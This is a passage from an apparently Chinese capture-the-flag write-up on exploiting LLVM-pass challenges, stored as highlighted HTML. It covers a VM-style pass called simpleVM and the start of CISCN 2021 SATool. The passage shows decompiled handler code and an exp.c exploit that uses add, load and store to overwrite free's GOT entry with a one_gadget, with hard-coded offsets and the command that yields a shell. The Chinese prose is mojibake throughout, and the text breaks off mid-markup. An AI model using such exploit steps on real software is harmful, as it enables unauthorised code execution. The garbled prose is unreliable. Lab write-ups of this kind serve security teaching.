[rbp-1B0h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *v9; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *v12; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *v15; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *v16; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="type">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOperand = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              ZExtValue = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="type">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="type">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬ç»ˆäºå¯ä»¥çŸ¥é“ä¸ºä»€ä¹ˆé¢˜ç›®çš„åå­—å«<code>simpleVM</code>äº†ï¼Œè¿™å°±æ˜¯å¾ˆç»å…¸çš„<code>VMpwn</code>ï¼Œåªä¸è¿‡å’Œ<code>llvm pass</code>ç›¸ç»“åˆè€Œå·²ã€‚è¿™ä¸ªå‡½æ•°å®ç°äº†<code>push</code>ã€<code>pop</code>ã€<code>store</code>ã€<code>load</code>ã€<code>add</code>æŒ‡ä»¤åŠŸèƒ½ã€‚ä¸ºäº†æ–¹ä¾¿çœ‹æ‡‚ä»£ç ï¼Œè¿™é‡Œå…ˆç®€å•åˆ†æå‡ ä¸ª<code>llvm pass</code>ä¸­çš„å‡½æ•°ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br></pre></td></tr></table></figure><p>è·å–å‡½æ•°çš„åå­—å¹¶èµ‹å€¼ç»™<code>Name</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br></pre></td></tr></table></figure><p>è·å–å‡½æ•°çš„ä¸€ä¸ªå‚æ•°å¹¶å°†å…¶èµ‹å€¼ç»™<code>v8</code><br>è¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨<code>add</code>ã€<code>store</code>ã€<code>load</code>ç›¸äº’é…åˆæ¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä¸‹é¢ç»™å‡ºå…³é”®ä»£ç ç‰‡æ®µ  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">if</span> ( v23 )&#123;</span><br><span class="line">    v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">    v24 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">    v24 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v24 == off_20DFD0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load</span></span><br><span class="line"><span class="keyword">if</span> ( v19 )&#123;</span><br><span class="line">    v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">    v20 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">    v20 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">    *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">    *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          </span><br><span class="line"><span class="comment">// add</span></span><br><span class="line"><span class="keyword">if</span> ( v15 )&#123;</span><br><span class="line">    v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">    v16 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">    v16 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 )&#123;</span><br><span class="line">    v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">    v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­¦è¿‡<code>VMpwn</code>çš„å¸ˆå‚…ä¼šå‘ç°ï¼Œè¿™é‡Œå¯ä»¥å¾ˆå®¹æ˜“çš„å®ç°ä»»æ„åœ°å€å†™<br>æˆ‘ä»¬å‰é¢<code>checksec</code>å‘ç°<code>opt-8</code>å¹¶æ²¡æœ‰å¼€å¯<code>PIE</code>ä¿æŠ¤ä»¥åŠ<code>got</code>è¡¨å¯å†™ã€‚é€šè¿‡åˆ†æï¼Œåœ¨è¯¥å…³é”®å‡½æ•°æ¯è®ºå¾ªç¯ç»“æŸæ—¶éƒ½ä¼šæ‰§è¡Œ<code>free</code>å‡½æ•°ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¿®æ”¹â€å¯„å­˜å™¨â€çš„å€¼ä¸º<code>got</code>è¡¨åœ°å€ï¼Œç„¶åå°†é‡Œé¢çš„å€¼è¯»è¿›â€å¯„å­˜å™¨â€ï¼Œç„¶åå†åˆ©ç”¨<code>add</code>å‡½æ•°å°†â€å¯„å­˜å™¨â€é‡Œçš„<code>free</code>å‡½æ•°æ”¹æˆ<code>onegadget</code>ï¼Œæœ€åå†™å›<code>free</code>çš„<code>got</code>è¡¨ä¸­ï¼Œç¨‹åºè°ƒç”¨<code>free</code>å³å¯æ‰§è¡Œ<code>onegadget</code>ã€‚æœ€ç»ˆçš„<code>exp</code>å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);  </span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ‰§è¡Œ<code>./opt-8 -load ./VMPass.so -VMPass ./exp.ll</code>å³å¯<code>getshell</code><br>ç”±äºæ²¡æœ‰åœ¨æ¯”èµ›ä¸­é‡åˆ°è¿‡è¿™ç§é¢˜ç›®ï¼Œæ‰€ä»¥ä¸çŸ¥é“è¿œç¨‹æ˜¯æ€ä¹ˆæ‰“çš„ã€‚å¬åˆ«çš„å¸ˆå‚…è¯´ï¼Œå¥½åƒå’Œ<code>kernel pwn</code>å’Œ<code>qemu</code>é€ƒé€¸ä¸€æ ·ï¼Œéƒ½æ˜¯ç›´æ¥ä¸Šä¼ ä¸€ä¸ª<code>elf</code>  </p><h2 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="[CISCN 2021] SATool"></a>[CISCN 2021] SATool</h2><p>é¦–å…ˆè¿˜æ˜¯æŒ‰ç…§ä¸Šé¢çš„æ–¹æ³•å®šä½åˆ°è¢«è¿›è¡Œä¿®æ”¹è¿‡çš„<code>runOnFunction</code>å‡½æ•°ä¸º<code>sub_19D0</code>ï¼Œç‚¹å¼€ä¸€çœ‹<code>500</code>å¤šè¡Œä»£ç ï¼Œç›´æ¥çœ‹çš„å¤´å¤§ï¼Œè¿™æ—¶å€™å°±ååˆ†çš„è€ƒéªŒæˆ‘ä»¬å¯¹å…³é”®ä»£ç çš„å®šä½äº†<br>é¦–å…ˆåœ¨æœ€å‰é¢  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>((llvm::Value *)a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">8</span> &amp;&amp; *Name == <span class="string">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 != (llvm::Value *)(a2 + <span class="number">9</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span> *)v4 - <span class="number">24</span>;</span><br><span class="line">        v82 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = *((_QWORD *)v5 + <span class="number">6</span>);</span><br><span class="line">        v7 = v5 + <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)v6 != v7 )</span><br></pre></td></tr></table></figure><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¦ä¸€å®šè¦æœ‰åä¸º<code>B4ckDo0r</code>ï¼ˆå°ç«¯åºï¼‰çš„å‡½æ•°æ‰å¯ä»¥è¿›è¡Œåé¢çš„æ“ä½œ<br>åé¢çš„ç¨‹åºå¤§æ¦‚å¯ä»¥çœ‹å‡ºï¼Œæ ¹æ®B4ckDo0rä¸­è°ƒç”¨ä¸åŒçš„å‡½æ•°ä»è€Œæ¥æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œæ¥ä¸‹æ¥è¿›è¡Œè¯¦ç»†çš„åˆ†æ<br>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å¦‚æœä¼ å…¥çš„æ˜¯<code>run</code>å‡½æ•°ï¼Œä»–æ‰€æ‰§è¡Œçš„ç¨‹åºä¸­å­˜åœ¨ä»¥ä¸‹è¿™æ®µä»£ç ï¼š  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span 